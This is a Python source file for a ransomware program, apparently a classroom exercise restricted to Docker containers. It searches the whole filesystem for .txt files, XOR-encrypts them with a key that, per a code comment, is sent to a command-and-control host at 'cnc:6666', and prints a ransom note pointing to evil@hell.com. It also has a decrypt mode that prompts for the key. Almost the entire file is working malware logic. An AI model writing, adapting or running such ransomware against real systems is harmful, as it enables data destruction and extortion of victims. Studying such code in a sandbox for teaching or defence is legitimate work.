import logging
import socket
import re
import sys
from pathlib import Path
import glob
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title {} to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        # return all files matching the filter
        path=Path('/')
        list_txt= (file for file in path.rglob(filter)) #creating a list of all files matching the filter
        list_str= [str(txt) for txt in list_txt] #converting the list of files to a list of strings with their names
        return list_str

    
    def encrypt(self):
        # main function for encrypting (see PDF)
        text_files = self.get_files("*.txt") #extracting all the files of .txt type into a list
        secret_manager = SecretManager() #creating the secret manager
        secret_manager.setup() #setting the key, salt and token. 
                                #saving salt and token in the target and sending the key, salt and the token to the cnc
        secret_manager.xorfiles(text_files) #encrypting txt files by the XOR method

        token = secret_manager.get_hex_token() #taking the string of token to show it in the message
        print(ENCRYPT_MESSAGE.format(token)) #showing the malware message

    def decrypt(self):
        # main function for decrypting   
        uncrypted=False   
        while not uncrypted: #while the files aren't uncrypted 
            try:
                key = (input("Enter the secret key:")) #asking the key

                text_files = self.get_files("*.txt") 
                secret_manager = SecretManager()
                secret_manager.set_key(key) #verifying if the key matches 
                secret_manager.xorfiles(text_files) #decrypting with the matching key
                print("Files are uncrypted!")
                uncrypted=True
                secret_manager.clean() #Mr Propre doing his job
            except NameError: #exception raises the error if the key doesn't match
                print("Oups, the wrong key!")
            
        

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()